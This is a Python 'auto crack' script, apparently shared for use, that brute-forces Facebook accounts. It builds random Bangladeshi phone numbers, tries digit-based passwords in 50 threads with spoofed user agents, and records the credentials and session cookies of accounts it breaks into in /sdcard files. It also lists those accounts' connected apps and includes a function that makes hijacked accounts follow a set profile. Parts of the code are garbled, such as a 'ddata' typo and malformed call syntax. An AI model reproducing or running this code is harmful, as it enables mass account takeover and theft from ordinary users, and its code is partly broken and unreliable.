import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ¤–] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ¤–] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/groups/3206414299669908/')
logo =("""\x1b[1;97m

\033[32;1m███████╗ █████╗      ██╗     ██╗ █████╗ ██████╗ 
\033[33;1m██╔════╝██╔══██╗     ██║     ██║██╔══██╗██╔══██╗
\033[34;1m███████╗███████║     ██║     ██║███████║██║  ██║
\033[35;1m╚════██║██╔══██║██   ██║██   ██║██╔══██║██║  ██║
\033[36;1m███████║██║  ██║╚█████╔╝╚█████╔╝██║  ██║██████╔╝
\033[37;1m╚══════╝╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚═╝  ╚═╝╚═════╝ 
\x1b[1;97m===================================================
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : SAJJJAD 
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. SAJJJAD 
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : sajjad569
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 01965-798980
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : AUTO CRACK
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : FREE
\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 2.0
====================================================""") 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example>: \033[38;5;45m019,\033[38;5;46m017,\033[38;5;195m018{x}')
    print(f' ===================================================')
    rk1 = '0172'
    rk2 = '0191'
    rk3 = '0185'
    rk4 = '0160'
    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE : \033[38;5;195m10000, \033[38;5;45m20000, \033[38;5;46m50000  \n \033[1;93m================\033[1;93m=================\033[1;93m===================\n \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m PUT CLONING LIMIT:\033[38;5;46m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m YOUR TOTAL IDS: \033[38;5;46m'+tl)
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m USE YOUR MOBILE DATA ')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m Use Flight Mode For Speed Up')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m TEAM TIGER SPAMMING SQUAD')
        jalan('  \x1b[1;97m===================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n ===============================================")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=wZ_pY9aMkf8AFEgFXkpkr-oo; sb=wZ_pY2-V7WuYpyeZg3yMObfx; locale=en_US; zsh=ASQZMRDclSEIR48qwhhwUQNHKnUDTKJhcWDVYloL1-mT5RVP7crDDMtsd1a2aUU3mSp9IFdryhwlwc9Ug0YTfy-1_ox79u8H4kQ_8-ppI2w5qqEz1mjoRrHhmZmqCZhlL4ZVWHNTyNCBOqLJlVEnl33K_PYHjNtzpG4jKGi5o0d8z0KygIYTXKphUgMSKuME-DOd0VE4xIkhtbGe0shqEIfnsaVA22fJKFlgABpkhVU2fAikSMhwRAqhNq3ekn2WXygL1fkURwX57EIeF-bBkS1ctgZS5lKaz8g4vMzYb-pi8R8LsiSLIOLvI16J-kVQZJP7dcY5kQGOXRaJW8L5xSI; m_pixel_ratio=1.75; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZiMnMxTnhVdV91WkVfUmlmYjE1SFhVRl95clNpUW5ISG5nekhsOEdjZDJxSE9IRXhuTUdkRFdsc2NEZGFwM1g2RSIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZmIyczFOeFV1X3VaRV9SaWZiMTVIWFVGX3lyU2lRbkhIbmd6SGw4R2NkMnFIT0hFeG5NR2REV2xzY0RkYXAzWDZFIiwicyI6Im1vYmlsZSJ9; wd=412x772; fr=0Io6O5s8KoLgbsXZd.AWXEheXKoKz1xa7kKeRNZbNcg-E.Bj9FoG.jZ.AAA.0.0.Bj_WpS.AWVQDaMcWZg',
            'referer': 'https://mbasic.facebook.com/login/?li=X2r9Y3JggxzXh8T85_4uW87S&e=1348131&shbl=1&ref=dbl&refsrc=deprecated&_rdr',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/?li=X2r9Y3JggxzXh8T85_4uW87S&e=1348131&shbl=1&ref=dbl&refsrc=deprecated&_rdr',ddata=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45mSAJJJAD -OK\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SAJJJAD -OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[SAJJJAD -CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SAJJJAD -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}SAJJJAD -XD{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

xxr()